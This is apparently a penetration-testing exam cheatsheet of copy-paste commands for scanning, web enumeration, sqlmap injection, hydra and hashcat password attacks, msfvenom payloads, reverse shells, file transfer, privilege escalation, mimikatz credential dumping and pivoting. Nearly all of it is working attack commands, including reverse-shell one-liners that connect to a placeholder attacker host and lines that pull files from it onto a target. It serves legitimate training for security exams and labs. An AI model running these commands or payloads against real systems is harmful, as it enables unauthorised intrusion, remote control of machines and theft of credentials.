# Cheatsheet

Dense, copy-paste command reference for exam day. Replace `<ip>` with the target and `<your-ip>` with your attacker machine. For the *why* and *when*, see the topic notes ([enumeration](../enumeration/README.md), [web](../web/README.md), [exploitation](../exploitation/README.md), [privilege-escalation](../privilege-escalation/README.md), [pivoting](../pivoting/README.md)).

---

## Host discovery

```bash
nmap -sn 10.10.10.0/24                 # ping sweep
fping -a -g 10.10.10.0/24 2>/dev/null  # live hosts only
netdiscover -i eth0                    # ARP discovery (ICMP blocked)
arp-scan --localnet
```

## Port scanning

```bash
nmap -sV -sC -oN scan.txt <ip>         # versions + default scripts
nmap -p- -oN allports.txt <ip>         # all 65535 TCP ports
nmap -sU --top-ports 50 <ip>           # top UDP ports
nmap -p <ports> -A <ip>                # aggressive on known-open ports
# Two-step: fast all-ports, then deep on what's open
nmap -p- --min-rate 1000 <ip>          # → then -sV -sC -p<found> <ip>
```

## Service enumeration

```bash
# SMB
enum4linux -a <ip>
smbclient -L //<ip>/ -N
smbmap -H <ip>
smbclient //<ip>/<share> -N
# FTP
ftp <ip>                               # anonymous / anything
# DNS zone transfer
dig axfr @<ip> <domain>
# SNMP
snmpwalk -v2c -c public <ip>
# SMTP user enum
nmap -p25 --script smtp-enum-users <ip>
```

## Web enumeration

```bash
whatweb http://<ip>
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
nikto -h http://<ip>
wpscan --url http://<ip> --enumerate u,p
# always check: /robots.txt  /sitemap.xml  page source  login forms
```

## SQL injection (sqlmap)

```bash
sqlmap -u "http://<ip>/page.php?id=1" --batch --dbs
sqlmap -u "http://<ip>/page.php?id=1" -D <db> --tables
sqlmap -u "http://<ip>/page.php?id=1" -D <db> -T users --dump
sqlmap -r request.txt --batch          # POST/login: save the Burp request first
# Manual login bypass:  ' OR '1'='1
```

## Password attacks

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<ip>
hydra -l admin -P rockyou.txt ftp://<ip>
hydra -l admin -P rockyou.txt <ip> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# Offline cracking
john --format=NT hashes.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt   # NTLM
hashcat -m 0 hashes.txt rockyou.txt                           # MD5
```

## Finding & running exploits

```bash
searchsploit <product> <version>
searchsploit -m <id>                   # copy exploit locally
# Metasploit
msfconsole -q
#   search <cve/product> → use <module> → set RHOSTS/LHOST/LPORT → run
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf -o s.elf
msfvenom -p php/reverse_php LHOST=<your-ip> LPORT=4444 -o s.php
```

## Reverse shells

```bash
# Listener (attacker)
nc -lvnp 4444

# Target
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<your-ip>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 4444 >/tmp/f
# Windows (PowerShell one-liner — base64 it if quoting breaks)
powershell -c "$c=New-Object Net.Sockets.TCPClient('<your-ip>',4444);$s=$c.GetStream();..."
```

### Stabilize a shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm
```

## File transfer

```bash
# Serve from attacker
python3 -m http.server 8000
# Pull onto target
wget http://<your-ip>:8000/file
curl http://<your-ip>:8000/file -o file
# Windows
certutil -urlcache -f http://<your-ip>:8000/file file.exe
powershell -c "iwr http://<your-ip>:8000/file -o file.exe"
# Netcat
nc -lvnp 4444 > file        # receiver
nc <ip> 4444 < file         # sender
```

## Privilege escalation — Linux

```bash
sudo -l                                 # → check GTFOBins for each entry
find / -perm -4000 -type f 2>/dev/null  # SUID
getcap -r / 2>/dev/null                 # capabilities
cat /etc/crontab                        # cron
uname -a                                # kernel → searchsploit
./linpeas.sh
```

## Privilege escalation — Windows

```cmd
whoami /priv                            :: SeImpersonate → Potato attacks
systeminfo                              :: → Windows-Exploit-Suggester
cmdkey /list                            :: stored creds
```
```
winPEAS.exe
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

## Credential dumping (Windows, post-SYSTEM)

```
# meterpreter
hashdump
load kiwi; creds_all
# mimikatz
privilege::debug
sekurlsa::logonpasswords
```

## Pivoting

```bash
# Metasploit
run autoroute -s 10.10.10.0/24
#   + use auxiliary/server/socks_proxy  → proxychains <tool> <internal-ip>
# SSH
ssh -L 8080:10.10.10.5:80 user@<pivot>  # local forward
ssh -D 1080 user@<pivot>                # SOCKS proxy
# chisel
./chisel server -p 8000 --reverse       # attacker
./chisel client <your-ip>:8000 R:socks  # target
# then
proxychains nmap -sT -Pn <internal-ip>
```

## Common ports (memorize these)

| Port | Service | | Port | Service |
|---|---|---|---|---|
| 21 | FTP | | 161 | SNMP (UDP) |
| 22 | SSH | | 389 | LDAP |
| 23 | Telnet | | 443 | HTTPS |
| 25 | SMTP | | 445 | SMB |
| 53 | DNS | | 1433 | MSSQL |
| 80 | HTTP | | 3306 | MySQL |
| 110 | POP3 | | 3389 | RDP |
| 139 | NetBIOS | | 5985 | WinRM |
